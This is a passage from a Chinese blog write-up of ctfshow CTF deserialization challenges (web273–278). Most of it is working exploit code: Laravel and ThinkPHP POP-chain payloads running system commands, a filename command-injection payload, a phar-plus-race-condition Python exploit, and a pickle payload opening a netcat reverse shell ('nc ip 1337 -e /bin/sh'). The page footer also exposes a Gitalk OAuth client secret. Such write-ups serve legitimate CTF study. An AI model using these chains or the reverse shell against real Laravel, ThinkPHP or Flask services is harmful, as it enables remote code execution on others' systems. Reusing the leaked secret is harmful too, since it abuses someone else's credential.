+发现了一篇<a href="https://www.anquanke.com/post/id/258264#h3-16">Laravel&lt;=5.5 POP链</a></p>
+<pre><code class="language-php">&lt;?php
+namespace Mockery\Generator {
+    class MockConfiguration {
+        protected $name = 'H3rmesk1t';
+    }
+    class MockDefinition {
+        protected $config;
+        protected $code;
+        public function __construct() {
+            $this-&gt;config = new MockConfiguration();
+            $this-&gt;code = &quot;&lt;?php system('cat /flag');?&gt;&quot;;
+        }
+    }
+}
+
+namespace Mockery\Loader {
+    class EvalLoader {}
+}
+
+namespace Illuminate\Bus {
+    use Mockery\Loader\EvalLoader;
+    class Dispatcher {
+        protected $queueResolver;
+        public function __construct() {
+            $this-&gt;queueResolver = [new EvalLoader(), 'load'];
+        }
+    }
+}
+
+namespace Illuminate\Broadcasting {
+    use Illuminate\Bus\Dispatcher;
+    use Mockery\Generator\MockDefinition;
+    class BroadcastEvent {
+        public $connection;
+        public function __construct() {
+            $this-&gt;connection = new MockDefinition();
+        }
+    }
+    class PendingBroadcast {
+        protected $events;
+        protected $event;
+        public function __construct() {
+            $this-&gt;events = new Dispatcher();
+            $this-&gt;event = new BroadcastEvent();
+        }
+    }
+    echo urlencode(serialize(new PendingBroadcast()));
+}
+?&gt;
+</code></pre>
+<h2 id="web273">web273</h2>
+<p>继续用上题的链子</p>
+<h2 id="web274">web274</h2>
+<p>ThinkPHP 5.1.x 中的<a href="https://www.freebuf.com/vuls/317886.html">反序列化利用链</a></p>
+<pre><code class="language-php">&lt;?php
+namespace think{
+    abstract class Model{
+        private $withAttr = [];
+        private $data = [];
+        public function __construct($function,$parameter){
+            $this-&gt;data['smi1e'] = $parameter;
+            $this-&gt;withAttr['smi1e'] = $function;
+        }
+    }
+}
+
+namespace think\model{
+    use think\Model;
+    class Pivot extends Model
+    {}
+}
+
+namespace think\process\pipes{
+    use think\model\Pivot;
+    class Windows
+    {
+        private $files = [];
+        public function __construct($function,$parameter){
+            $this-&gt;files = [new Pivot($function,$parameter)];
+        }
+    }
+    $function = 'system';
+    $parameter = 'cat /flag';
+    $aaa = new Windows($function,$parameter);
+    echo base64_encode(serialize($aaa));
+}
+</code></pre>
+<h2 id="web275">web275</h2>
+<pre><code class="language-php">&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-08 19:13:36
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-08 20:08:07
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+highlight_file(__FILE__);
+
+class filter{
+    public $filename;
+    public $filecontent;
+    public $evilfile=false;
+
+    public function __construct($f,$fn){
+        $this-&gt;filename=$f;
+        $this-&gt;filecontent=$fn;
+    }
+    public function checkevil(){
+        if(preg_match('/php|\.\./i', $this-&gt;filename)){
+            $this-&gt;evilfile=true;
+        }
+        if(preg_match('/flag/i', $this-&gt;filecontent)){
+            $this-&gt;evilfile=true;
+        }
+        return $this-&gt;evilfile;
+    }
+    public function __destruct(){
+        if($this-&gt;evilfile){
+            system('rm '.$this-&gt;filename);
+        }
+    }
+}
+
+if(isset($_GET['fn'])){
+    $content = file_get_contents('php://input');
+    $f = new filter($_GET['fn'],$content);
+    if($f-&gt;checkevil()===false){
+        file_put_contents($_GET['fn'], $content);
+        copy($_GET['fn'],md5(mt_rand()).'.txt');
+        unlink($_SERVER['DOCUMENT_ROOT'].'/'.$_GET['fn']);
+        echo 'work done';
+    }
+    
+}else{
+    echo 'where is flag?';
+}
+</code></pre>
+<p>这题思路有点意思，我还以为需要写shell，但看了下没有办法绕过检查，利用点在<code>__destruct</code>函数中的命令执行存在命令注入漏洞。</p>
+<p>构造payload</p>
+<pre><code>1.php;cat flag.php
+</code></pre>
+<h2 id="web276">web276</h2>
+<pre><code class="language-php">&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-08 19:13:36
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-08 20:08:07
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+highlight_file(__FILE__);
+
+class filter{
+    public $filename;
+    public $filecontent;
+    public $evilfile=false;
+    public $admin = false;
+
+    public function __construct($f,$fn){
+        $this-&gt;filename=$f;
+        $this-&gt;filecontent=$fn;
+    }
+    public function checkevil(){
+        if(preg_match('/php|\.\./i', $this-&gt;filename)){
+            $this-&gt;evilfile=true;
+        }
+        if(preg_match('/flag/i', $this-&gt;filecontent)){
+            $this-&gt;evilfile=true;
+        }
+        return $this-&gt;evilfile;
+    }
+    public function __destruct(){
+        if($this-&gt;evilfile &amp;&amp; $this-&gt;admin){
+            system('rm '.$this-&gt;filename);
+        }
+    }
+}
+
+if(isset($_GET['fn'])){
+    $content = file_get_contents('php://input');
+    $f = new filter($_GET['fn'],$content);
+    if($f-&gt;checkevil()===false){
+        file_put_contents($_GET['fn'], $content);
+        copy($_GET['fn'],md5(mt_rand()).'.txt');
+        unlink($_SERVER['DOCUMENT_ROOT'].'/'.$_GET['fn']);
+        echo 'work done';
+    }
+    
+}else{
+    echo 'where is flag?';
+}
+</code></pre>
+<p>增加了admin属性的检查，上题方法无法利用，需要利用<a href="https://www.freebuf.com/articles/web/305292.html">phar反序列化</a>。</p>
+<p>生成phar文件，需要设置php.ini中的配置如下</p>
+<pre><code>[Phar]
+; http://php.net/phar.readonly
+phar.readonly = Off
+</code></pre>
+<p>生成phar脚本</p>
+<pre><code class="language-php">&lt;?php
+    class filter{
+        public $filename;
+        public $filecontent;
+        public $evilfile=false;
+        public $admin = false;
+
+        public function __construct($f,$fn){
+            $this-&gt;filename=$f;
+            $this-&gt;filecontent=$fn;
+        }
+    }
+ 
+    $a=new filter(';cat fla?.php','1');
+    $a-&gt;admin = true;
+    $a-&gt;evilfile = true;
+    $phar = new Phar('1.phar');
+    $phar-&gt;setStub('&lt;?php __HALT_COMPILER();?&gt;');
+    $phar-&gt;setMetadata($a);
+    $phar-&gt;addFromString('1.txt','dky');
+?&gt;
+</code></pre>
+<p>根据上面参考文章<code>file_put_contents</code>能够触发phar反序列化，但是我们上传的phar文件会被删除，然后重命名一个txt文件，这里可以利用条件竞争去访问到我们刚上传的phar文件.</p>
+<pre><code class="language-python">import requests
+import threading
+import time
+
+success = False
+# 获取文件数据
+def getPhar(phar):
+    with open(phar,'rb') as f:
+        data = f.read()
+        return data
+
+# 写phar文件
+def writePhar(url, data):
+    requests.post(url, data)
+
+# 触发反序列化
+def usePhar(url, data):
+    global  success
+    r = requests.post(url, data).text
+    if 'ctfshow{' in r and success is False:
+        print(r)
+        success =True
+
+def main():
+    global success
+    url = 'http://0af389e8-5a88-446a-bd3a-e61a09c9b19d.challenge.ctf.show/'
+    phar = getPhar('1.phar')
+    while success is False:
+        time.sleep(1)
+        w = threading.Thread(target=writePhar, args=(url+'?fn=1.phar', phar))
+        s = threading.Thread(target=usePhar, args=(url+'?fn=phar://1.phar/1.txt', ''))
+        w.start()
+        s.start()
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+<h2 id="web277">web277</h2>
+<p>python中的<a href="https://xz.aliyun.com/t/7436">pickle反序列化</a></p>
+<p>payload</p>
+<pre><code class="language-python">import pickle
+import os
+import base64
+import requests
+
+
+class genpoc(object):
+    def __reduce__(self):
+        s = &quot;&quot;&quot;nc ip 1337 -e /bin/sh&quot;&quot;&quot;  # 要执行的命令
+        return os.popen, (s,)        # reduce函数必须返回元组或字符串
+
+e = genpoc()
+poc = pickle.dumps(e)
+
+print(poc) # 此时，如果 pickle.loads(poc)，就会执行命令
+
+c = base64.b64encode(poc)
+print(c)
+
+url=&quot;http://a084eafb-f2b2-4846-8da3-918a045b17d5.challenge.ctf.show/backdoor&quot;
+params={'data':c}
+
+r=requests.get(url=url,params=params)
+print(r.text)
+</code></pre>
+<p>后台源码如下</p>
+<pre><code class="language-python">from flask import Flask,request
+import pickle
+import base64
+app = Flask(__name__)
+
+@app.route('/')
+def hello_world():
+    return 'where is flag?&lt;!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) --&gt;'
+@app.route('/backdoor')
+def backdoor():
+    data=request.args.get('data')
+    m=base64.b64decode(data)
+    m=pickle.loads(m)
+    return 'backdoor here'
+
+if __name__ == &quot;__main__&quot;:
+    app.run(host=&quot;0.0.0.0&quot;, port=80)
+</code></pre>
+<h2 id="web278">web278</h2>
+<p>后台源码如下</p>
+<pre><code class="language-python">from flask import Flask,request
+import pickle
+import base64
+app = Flask(__name__)
+
+@app.route('/')
+def hello_world():
+    return 'where is flag?&lt;!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) --&gt;'
+@app.route('/backdoor')
+def backdoor():
+    data=request.args.get('data')
+    m=base64.b64decode(data)
+    if str(m).find('system')&lt;0:
+        m=pickle.loads(m)
+    return 'backdoor here'
+
+if __name__ == &quot;__main__&quot;:
+    app.run(host=&quot;0.0.0.0&quot;, port=80)
+</code></pre>
+<p>使用<code>os.popen</code>函数就可以了，上题不知道为啥<code>os.system</code>报internal error，所以都用的<code>os.popen</code></p>
+<h2 id="参考">参考</h2>
+<p>感谢gkjzjh146的Writeup，写得很仔细。😘</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/ctfshowthinkphp-zhuan-ti/">
+                  <h3 class="post-title">
+                    [ctfshow]ThinkPHP专题
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
